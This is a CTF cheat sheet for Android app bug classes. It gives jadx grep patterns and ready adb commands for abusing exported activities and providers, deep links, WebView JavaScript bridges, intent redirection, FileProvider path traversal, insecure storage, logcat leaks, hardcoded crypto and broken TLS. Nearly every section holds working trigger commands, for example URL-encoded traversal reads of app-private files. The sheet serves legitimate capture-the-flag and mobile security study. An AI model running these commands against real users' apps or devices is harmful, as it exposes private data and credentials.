# Android CTF bug classes — spot, trigger, own

Static spots are jadx greps; triggers are adb commands from a run environment
(`references/android-dynamic.md`). Component attacks assume the app is installed.
Repo-root-relative paths use `$ROOT` as defined in `references/android-dynamic.md`.

## Master table

| Bug class | Static tell | Trigger |
|---|---|---|
| Exported activity/service/receiver | manifest `exported="true"` or intent-filter | `am start` / `am start-foreground-service` / `am broadcast` |
| Exported provider | `<provider>` + authorities | `content query/insert/update/delete/read` |
| Deep link handler | `<intent-filter><data android:scheme=...>` | `am start -a android.intent.action.VIEW -d` |
| WebView JS bridge | `addJavascriptInterface` | load attacker page → call bridge methods |
| WebView file access | `setAllowFileAccessFromFileURLs(true)` / universal variant | `file://` page reads app-private data |
| Intent redirection | `getParcelableExtra` → `startActivity` | nested Intent (PoC app / frida) |
| PendingIntent mutability | mutable PI + implicit intent | fill-in via any sender (concept) |
| FileProvider traversal | `res/xml/*paths*.xml` overly broad | `content read` with `%2e%2e%2f` |
| Insecure storage | prefs/DB written unencrypted | `run-as` / `adb pull` + sqlite |
| Logcat leaks | `Log.d(` near secrets / TextWatcher | logcat while exercising |
| Hardcoded crypto | `SecretKeySpec`, fixed IVs | offline decrypt |
| Broken TLS trust | empty `checkServerTrusted`, `proceed()` | mitmproxy |

## 1. Exported components

Get the surface first: `scripts/apk-triage.sh` manifest pass, or re-grep the decoded
manifest (`references/android-recon.md` §3). Remember the pre-Android-12 rule:
intent-filter present and no `android:exported="false"` ⇒ exported.

```bash
PKG=com.example.ctf
adb shell am start -n "$PKG/.AdminActivity" --ez admin true --es token x
adb shell am start-foreground-service -n "$PKG/.SecretService" --es action dump
adb shell am broadcast -a "$PKG.UNLOCK" -n "$PKG/.UnlockReceiver" --el pin 1337
```

`am` extra flags: `--es` string, `--ei` int, `--el` long, `--ef` float, `--ez`
boolean, `--esa` string array. Add `-W` to `am start` to see result/crash. When an
extra type is wrong the app usually dies in `NumberFormatException` — watch logcat,
fix the type, iterate. Exported components that "do a thing" (print flag, flip a
role, spawn a service) with no permission guard are the classic easy-mobile flag.

## 2. Content providers

```bash
URI="content://com.example.ctf.provider/items"
adb shell content query --uri "$URI"
adb shell content query --uri "$URI" --projection _id,title --where "secret IS NOT NULL"
adb shell content insert --uri "$URI" --bind title:s:admin --bind role:i:1
adb shell content update --uri "$URI" --bind role:i:0 --where "_id=1"
adb shell content delete --uri "$URI" --where "_id=2"
adb shell content read --uri "content://com.example.ctf.fileprovider/root/%2e%2e%2f%2e%2e%2fdata%2fdata%2fcom.example.ctf%2fshared_prefs%2fprefs.xml" > out.xml
```

`content read` dumps whatever `openFile()`/`openInputStream()` returns — not every
provider implements it. `--bind` types: `s` string, `i` int, `l` long, `f` float,
`b` boolean. Providers backed by `path-permission`/`readPermission` will deny
without it — check the manifest.

## 3. Deep links

```bash
adb shell am start -a android.intent.action.VIEW -d "ctfapp://secret?token=AAAA" com.example.ctf
adb shell am start -a android.intent.action.VIEW -d "https://example.com/callback?code=x"
```

Chase the handler in jadx (`onCreate`/`onNewIntent` + `getData()`/`getQueryParameter`).
Common CTF shape: the handler feeds the URI (or a query param) straight into a
WebView → chain into §4, or into a "verify token" check that trusts a param.
Multiple activities may share one scheme — target the specific one with `-n`.

## 4. WebView and JS bridges

jadx greps:

```bash
grep -rn 'setJavaScriptEnabled(true)\|addJavascriptInterface\|setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs\|onReceivedSslError\|shouldOverrideUrlLoading\|loadUrl(' jadx-out/sources
```

Attack shapes, easiest first:

| Config | Bug | Exploit |
|---|---|---|
| `addJavascriptInterface(obj, "bridge")` on API < 17 | classic reflection RCE: JS reaches `obj.getClass().forName('java.lang.Runtime')...` — works because pre-4.2 any method is exposed | load a page you control into that WebView; run the classic bridge PoC JS |
| `@JavascriptInterface` methods on modern Android | no reflection, but bridged methods themselves are reachable | read bridge class in jadx: anything like `getFlag()`, `exec(cmd)`, `decrypt(k)` — call `window.bridge.getFlag()` from your page |
| `setAllowFileAccessFromFileURLs(true)` / universal | a `file://` page can read app files or cross-file XHR | push/serve an HTML file, get it loaded, XHR `/data/data/pkg/...` and exfiltrate |
| URL comes from intent/deep link | attacker page in trusted WebView = §4 row 1/2 | deep link → your page → bridge |
| `onReceivedSslError` → `handler.proceed()` | TLS warnings ignored | plain mitm (dynamic ref §6) |

Getting your page loaded: hosted URL + deep link handler; `adb shell am start -d
"file:///sdcard/poc.html"`? blocked on modern; cleanest is a local `python -m
http.server` + a deep link/intent that loads `http://<host-LAN-IP>:8000/poc.html`
(cleartext must be allowed — check `usesCleartextTraffic`). `adb reverse` makes the
app reach the host via `127.0.0.1:<port>`.

## 5. Intent redirection (embedded intents)

Static tell:

```java
Intent inner = getIntent().getParcelableExtra("redirect");   // or getSerializableExtra
startActivity(inner);                                        // no validation
```

You control the inner Intent only by sending a nested Parcelable — `am` cannot pass
parcelables, so either:

1. PoC app: 15 lines (an activity that `putExtra("redirect", maliciousIntent)` and
   starts the target), built once in Android Studio and reused per event; or
2. frida: hook the target's `onCreate`, read the extra class, build the Intent with
   `Java.use('android.content.Intent').$new()`, set the destination (`setClassName`),
   and start it — no second APK needed.

Watch for the pattern twice-embedded (`getParcelableExtra` inside the inner intent
too) and for the variant where the app calls `startService`/`sendBroadcast` instead
of `startActivity`.

## 6. PendingIntent mutability

Static tell: `PendingIntent.getActivity(ctx, 0, intent, flags)` where the target
SDK >= 31 forces `FLAG_IMMUTABLE`/`FLAG_MUTABLE` explicitly; a **mutable** PI over
an implicit base intent lets any sender `fillIn()` extras/action. In CTFs this is
usually paired with a privileged component that acts on the PI's inner intent.
Exploitation needs another app component or a frida-crafted send — treat as intent
redirection (§5) with a detour.

## 7. FileProvider path traversal

Read `apk-tool/res/xml/*_paths*.xml` (referenced from the manifest's
`<provider android:name="androidx.core.content.FileProvider" meta-data>`):
`root-path name="root" path="/"` is the giveaway — anything under `/` is fetchable.
URL-encoded traversal keeps the resolver from normalizing your `..`:

```bash
adb shell content read --uri \
  "content://com.example.ctf.fileprovider/root/%2e%2e%2f%2e%2e%2f%2e%2e%2fdata%2fdata%2fcom.example.ctf%2ffiles%2fflag.txt"
```

Decode mentally: `%2e%2e%2f` = `../`. Target `shared_prefs/*.xml`, `databases/`,
`/data/misc/` on rooted envs. Compare against the fix (path traversal checks live
in the provider's `openFile` override — read it in jadx for the exact sanitization
to sidestep, e.g. double-encode or absolute-path tricks).

## 8. Insecure storage

```bash
adb shell run-as com.example.ctf ls -laR /data/data/com.example.ctf/   # debuggable only
adb shell run-as com.example.ctf cat shared_prefs/secret_prefs.xml
adb root && adb pull /data/data/com.example.ctf/ pulled/               # rooted env
adb pull /sdcard/Android/data/com.example.ctf/files/ sd/               # external, may need root on 11+
```

Then: `sqlite3 pulled/databases/*.sqlite '.dump'`, grep everything. Challenge apps
love plaintext "premium"/"unlocked" flags in prefs — flip them and relaunch.
External-storage notes (unencrypted + world-readable on old Androids) are the
"physical access" version of the same class.

## 9. Logcat leaks

```bash
adb logcat -c && adb logcat | grep -aiE 'flag|secret|token|key|password|auth'
```

Exercise the app: type into every field (many CTF apps `Log.d` the TextWatcher
value — a keystroke leak), press everything, rotate the screen. Also
`adb shell dumpsys activity ... | grep -i uri` for interesting extras/URIs.

## 10. Hardcoded crypto

jadx: `SecretKeySpec(`, `IvParameterSpec(`, `Cipher.getInstance("AES/...")`,
base64 constants feeding them. Offline decrypt (no device needed):

```bash
scripts/ctf python - <<'PY'
from base64 import b64decode
from Crypto.Cipher import AES   # pycryptodome from the shared venv
key  = b64decode('...')         # pasted from jadx
ct   = b64decode('...')
print(AES.new(key, AES.MODE_ECB).decrypt(ct))
PY
```

Same pattern for DES/3DES, XOR (try repeated-key XOR against a known plaintext
prefix like `flag{`). Encrypted SharedPreferences (androidx security-crypto) are
only as strong as the key: the master key or its passphrase is in the dex more
often than not.

## 11. Cert / TLS issues

| Tell in jadx/xml | Meaning | Abuse |
|---|---|---|
| empty `checkServerTrusted` / `TrustManager` that never throws | all certs accepted | mitmproxy with any CA |
| `onReceivedSslError` → `proceed()` | WebView ignores errors | mitm |
| `network_security_config` with `<certificates src="user"/>` or per-domain trust-anchors | user CA enough for that domain | install mitm CA as user cert, no frida |
| `android:usesCleartextTraffic="true"` | plain http allowed | just proxy it |

Otherwise fall back to frida unpinning (`references/android-dynamic.md` §6).

## 12. Odds and ends that win mobile CTFs

- `android:allowBackup="true"` → `adb backup` is dead on modern Android but its
  spiritual successor is the storage section: if you can pull `/data/data`, do.
- Keystore-backed keys are unextractable by design — hook the code *around* them
  (`Cipher.doFinal` input/output) instead.
- Firebase / backend endpoints found statically → recon ref §6 (remote gate).
- Multi-dex: always search ALL dex — jadx handles it, but raw `grep` on the apk only
  sees strings, not xrefs.
- Flutter apps route everything through `libapp.so`; string constants sit in the
  snapshot — blutter first, then dynamic ref for runtime inspection.
